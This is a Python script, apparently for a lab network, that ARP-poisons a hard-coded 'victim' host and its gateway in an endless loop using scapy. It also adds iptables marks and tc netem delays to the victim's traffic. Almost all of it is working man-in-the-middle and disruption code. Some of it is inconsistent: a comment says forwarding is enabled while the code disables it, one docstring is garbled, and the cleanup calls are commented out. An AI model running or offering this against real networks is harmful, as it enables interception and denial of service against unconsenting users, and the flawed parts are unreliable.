# sudo modprobe sch_netem <- install tc : netem module
# sudo apt install iproute2

from scapy.all import Ether, ARP, srp, send
import argparse
import time
import os
import sys

def _enable_linux_iproute():
    """
    Enables IP route ( IP Forward ) in linux-based distro
    """
    file_path = "/proc/sys/net/ipv4/ip_forward"
    with open(file_path) as f:
        if f.read().strip() == "1":
            # already enabled
            print("IP forwarding is already enabled.")
            return
    with open(file_path, "w") as f:
        f.write("1")

def _disable_linux_iproute():
    """
    Disable IP route ( IP Forward ) in linux-based distro
    """
    file_path = "/proc/sys/net/ipv4/ip_forward"
    with open(file_path, "r") as f:
        if f.read().strip() == "0":
            # already enabled
            print("IP forwarding is already disabled.")
            return

    with open(file_path, "w") as f:
        f.write("0")

def _enable_windows_iproute():
    """
    Enables IP route (IP Forwarding) in Windows
    """
    from services import WService
    # enable Remote Access service
    service = WService("RemoteAccess")
    service.start()

def enable_ip_route(verbose=True):
    """
    Enables IP forwarding
    """
    if verbose:
        print("[!] Enabling IP Routing...")
    _enable_windows_iproute() if "nt" in os.name else _enable_linux_iproute()
    if verbose:
        print("[!] IP Routing enabled.")

def get_mac(ip):
    """
    Returns MAC address of any device connected to the network
    If ip is down, returns None instead
    """
    ans, _ = srp(Ether(dst='ff:ff:ff:ff:ff:ff')/ARP(pdst=ip), timeout=3, verbose=0)
    if ans:
        return ans[0][1].src

def spoof(target_ip, target_mac, host_ip, verbose=True):
    """
    Spoofs `target_ip` saying that we are `host_ip`.
    it is accomplished by changing the ARP cache of the tar/usr/bin/python3get (poisoning)
    """
    # craft the arp 'is-at' operation packet, in other words; an ARP response
    # we don't specify 'hwsrc' (source MAC address)
    # because by default, 'hwsrc' is the real MAC address of the sender (ours)
    arp_response = ARP(pdst=target_ip, hwdst=target_mac, psrc=host_ip, op='is-at')
    # send the packet
    # verbose = 0 means that we send the packet without printing any thing
    send(arp_response, verbose=0)
    if verbose:
        # get the MAC address of the default interface we are using
        self_mac = ARP().hwsrc
        print("[+] Sent to {} : {} is-at {}".format(target_ip, host_ip, self_mac))

def restore(target_ip, host_ip, verbose=True):
    """
    Restores the normal process of a regular network
    This is done by sending the original informations 
    (real IP and MAC of `host_ip` ) to `target_ip`
    """
    # get the real MAC address of target
    target_mac = get_mac(target_ip)
    # get the real MAC address of spoofed (gateway, i.e router)
    host_mac = get_mac(host_ip)
    # crafting the restoring packet
    arp_response = ARP(pdst=target_ip, hwdst=target_mac, psrc=host_ip, hwsrc=host_mac, op="is-at")
    # sending the restoring packet
    # to restore the network to its normal process
    # we send each reply seven times for a good measure (count=7)
    send(arp_response, verbose=0, count=7)
    if verbose:
        print("[+] Sent to {} : {} is-at {}".format(target_ip, host_ip, host_mac))


import subprocess

def add_network_delay_for_ip(interface, source_ip, delay="15ms"):
    """
    Adds a delay to packets forwarded from a specific IP address.
    """
    try:
        # Step 1: Mark packets from the specific IP using iptables
        print(f"[INFO] Marking packets from IP {source_ip}...")
        subprocess.run(
            ["sudo", "iptables", "-A", "INPUT", "-s", source_ip, "-j", "MARK", "--set-mark", "1"],
            check=True
        )

        # Step 2: Create a root qdisc with a priority scheduler (prio) for traffic management
        print(f"[INFO] Adding prio qdisc to interface {interface}...")
        subprocess.run(
            ["sudo", "tc", "qdisc", "add", "dev", interface, "root", "handle", "1:", "prio"],
            check=True
        )

        # Step 3: Apply the filter for packets marked with "1" (from iptables)
        print(f"[INFO] Adding filter for packets marked with '1' from IP {source_ip}...")
        subprocess.run(
            ["sudo", "tc", "filter", "add", "dev", interface, "parent", "1:", "protocol", "ip", 
             "handle", "1", "fw", "flowid", "1:1"],
            check=True
        )

        # Step 4: Add the network delay to the marked packets (flowid 1:1)
        print(f"[INFO] Adding delay {delay} for packets from IP {source_ip} on interface {interface}...")
        subprocess.run(
            ["sudo", "tc", "qdisc", "add", "dev", interface, "parent", "1:1", "handle", "10:", "netem", "delay", delay],
            check=True
        )

        print(f"[SUCCESS] Applied {delay} network delay for IP {source_ip} on interface {interface}.")
    except subprocess.CalledProcessError as e:
        print(f"[ERROR] Failed to add network delay: {e}")
    except PermissionError:
        print("[ERROR] Permission denied. Try running the script as root (sudo).")

def remove_network_delay_for_ip(interface, source_ip):
    """
    Removes the network delay and the iptables rule for the specific IP address.
    """
    try:
        # Remove the delay using tc
        print(f"[INFO] Removing network delay from interface {interface}...")
        subprocess.run(
            ["sudo", "tc", "qdisc", "del", "dev", interface, "root"],
            check=True
        )
        print(f"[SUCCESS] Removed network delay from interface {interface}.")

        # Remove the iptables rule for the specific source IP
        print(f"[INFO] Removing iptables rule for source IP {source_ip}...")
        subprocess.run(
            ["sudo", "iptables", "-D", "INPUT", "-s", source_ip, "-j", "MARK", "--set-mark", "1"],
            check=True
        )
        print(f"[SUCCESS] Removed iptables rule for source IP {source_ip}.")
    
    except subprocess.CalledProcessError as e:
        print(f"[ERROR] Failed to remove network delay: {e}")
    except PermissionError:
        print("[ERROR] Permission denied. Try running the script as root (sudo).")

if __name__ == "__main__":
    # Customize the delay as needed -> delay when forwarding packet
    delay_time = "60ms"
    # indicate specific interface
    network_interface = "ens2"
    # victim ip address
    target_ip = "192.168.10.2"
    # victim mac address
    target_mac = get_mac(target_ip)
    # gateway ip address
    gateway_ip = "192.168.10.1"
    # gateway mac address
    gateway_mac = get_mac(gateway_ip)
    # print progress to the screen
    verbose = True


    # enable ip forwarding
    _disable_linux_iproute()
    # enable_ip_route()
    # Add delay for packets from a specific IP address
    add_network_delay_for_ip(network_interface, target_ip, delay=delay_time)
    try:
        while True:
            # telling the `target` that we are the `host`
            spoof(target_ip, target_mac, gateway_ip, verbose)
            # telling the `host` that we are the `target`
            spoof(gateway_ip, gateway_mac, target_ip, verbose)
            # sleep for few second
            time.sleep(1)
    except KeyboardInterrupt:
        print("[!] Detected CTRL+C ! restoring the network, please wait...")
        restore(target_ip, gateway_ip)
        restore(gateway_ip, target_ip)
        # if "nt" not in os.name:
        #     _disable_linux_iproute()
        #     remove_network_delay_for_ip(network_interface, target_ip)


'''
添加 iptables 规则 : sudo iptables -A INPUT -s 192.168.10.25 -j MARK --set-mark 1
查看 iptables : sudo iptables -L
设置 tc 队列规则:
sudo tc qdisc add dev ens2 root handle 1: prio # 为接口 ens2 添加一个优先级队列
sudo tc filter add dev ens2 parent 1: protocol ip handle 1 fw flowid 1:1 # 基于 iptables 中标记的 MARK（值为 1）来筛选流量
sudo tc qdisc add dev ens2 parent 1:1 handle 10: netem delay 15ms # 为所有标记为 1 的流量添加了 15ms 的延迟
取消 iptables 规则: sudo iptables -D INPUT -s 192.168.10.25 -j MARK --set-mark 1
删除 tc 队列规则 ( 所有 ): sudo tc qdisc del dev ens2 root
顯示 tc 規則: sudo tc -s qdisc show dev ens2
'''